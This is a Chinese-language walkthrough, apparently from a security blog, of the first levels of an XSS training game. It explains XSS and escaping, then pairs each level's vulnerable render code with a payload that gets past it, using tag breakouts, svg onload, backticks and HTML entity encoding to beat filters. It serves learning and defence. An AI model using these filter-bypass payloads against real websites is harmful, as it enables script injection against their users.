## 原创： Kale 合天智汇  

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)  

  
** <一>**

 **题记**

最近发现一个xss的攻防网站，界面很有意思，很适合寓教于乐。于是玩了一下午，特此记录下来！xss姿势众多，所以每关也只是给了一部分示例！

 ** <二>**  

 **知识前导**

#### 什么是XSS？

XSS 或者说跨站脚本是一种 Web
应用程序的漏洞，当来自用户的不可信数据被应用程序在没有验证以及反射回浏览器而没有进行编码或转义的情况下进行了处理，导致浏览器引擎执行了代码。

#### XSS防护逻辑

如果你可以使得一个Web应用程序满足以下规则，XSS可以被减少。

 **验证输入并且基于语境和按照正确的顺序转义不可信数据**

![image.png](https://image.3001.net/images/20190729/1564366320_5d3e55f0841ff.png!small)  

 **输入验证**

所有不可信数据应该针对Web应用程序的逻辑在处理和存储前进行验证

##### 浏览器解析顺序

![image.png](https://image.3001.net/images/20190729/1564366329_5d3e55f9384db.png!small)  

##### 浏览器解码顺序

![image.png](https://image.3001.net/images/20190729/1564366343_5d3e560755afb.png!small)  

解码和解析顺序意味着很多东西。如果对不可信数据的编码或解码以错误的顺序或错误的环境，将再次有机会导致XSS漏洞的发生。编码或者转义对不同的环境要求不同。这些编码的顺序应该取决于应用程序的逻辑。

一个典型的不可信数据可以反射在HTML，HTML属性，脚本变量，脚本块，含状态传输的参数，URL、风格等中。不同的转义方法为了确保XSS的防护必须要在不同的环境
中实现。

 ** <三>**  

 **正文**

01

 **server code:**

    
    
       function render (input) {        return '<div>' + input + '</div>'    }

  

 **input code:**

    
    
     <script>alert(1)</script>

第一关，没啥说的，没有任何过滤，直接输出到了js里面。  

02

 **server code:**

    
    
        function render (input) {        return '<textarea>' + input + '</textarea>'    }

 **input code:**

    
    
        </textarea><script>alert(1)</script><textarea>

这一关闭合textarea标签即可  

03

####  **server code:**

    
    
        function render (input) {        return '<input type="name" value="' + input + '">'    }

####  **input code:**

    
    
     "><script>alert(1)</script><a "
    
    
     "><svg/onload=alert(1)></div>

此关闭合双引号及及input标签即可！  

 **04**

 **server code:**

    
    
        function render (input) {        const stripBracketsRe = /[()]/g        input = input.replace(stripBracketsRe, '')        return input    }

 **input code:**  

    
    
      <script>alert`1`</script>

这里过滤括号，可以使用反引号绕过，当然可以使用html实体编码绕过  

    
    
    <svg><script>alert&#40;1&#41;</script>

  

05

 **server code:**

    
    
        function render (input) {        const stripBracketsRe = /[()`]/g        input = input.replace(stripBracketsRe, '')        return input    }

 **input code:**  

    
    
     <svg><script>alert&#40;1&#41;</script>

在上题基础上加了个``反引号过滤，html实体编码绕过

06

 **server code:**

    
    
        function render (input) {        input = input.replace(/-->/g, '

